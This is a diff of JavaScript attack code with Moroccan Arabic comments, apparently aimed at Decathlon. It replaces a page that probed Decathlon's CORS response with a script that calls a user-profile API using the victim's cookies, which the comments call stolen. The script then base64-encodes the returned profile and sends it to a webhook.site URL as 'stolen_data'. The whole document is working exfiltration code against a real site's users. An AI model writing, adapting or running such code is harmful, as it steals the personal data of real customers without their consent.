@@ -1,24 +1,25 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <h1>Security Audit in Progress...</h1>
-    <script>
-        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+// 1. رابط الـ API اللي كيجيب معلومات المستخدم في Decathlon
+const targetApi = 'https://www.decathlon.com/api/v1/user/profile'; // هاد الرابط مثال، حط الرابط الحقيقي اللي لقيتي
+const myWebhook = 'https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0'; // الرابط ديالك اللي في التصويرة
 
-        // طلب بسيط لـ Decathlon باش نشوفو الـ Response Headers
-        fetch('https://www.decathlon.com/', {
-            method: 'GET',
-            mode: 'cors'
-        })
-        .then(response => {
-            // غانشوفو واش السيرفر جاوبنا بـ OK (يعني قبل GitHub)
-            var status = response.status;
-            var type = response.type;
-            window.location.href = webhook + "?status=" + status + "&cors_type=" + type;
-        })
-        .catch(err => {
-            window.location.href = webhook + "?error=" + btoa(err.message);
-        });
-    </script>
-</body>
-</html>
+// 2. دالة لسحب البيانات وإرسالها لبرا
+fetch(targetApi, {
+    method: 'GET',
+    credentials: 'include', // هادي ضرورية باش يصيفط الكوكيز اللي سرقتي
+    headers: {
+        'Accept': 'application/json'
+    }
+})
+.then(response => response.json())
+.then(data => {
+    // 3. تحويل البيانات لـ Base64 وصيفطها للـ Webhook
+    const encodedData = btoa(JSON.stringify(data));
+    fetch(myWebhook + '?stolen_data=' + encodedData);
+    
+    // إظهار تنبيه للتأكيد (بحال اللي درتي في التصويرة)
+    alert("Full Profile Data Sent to Webhook!");
+})
+.catch(err => {
+    // إذا وقع بلوك، صيفط الـ Error باش تعرف السبب
+    fetch(myWebhook + '?error=' + btoa(err.message));
+});
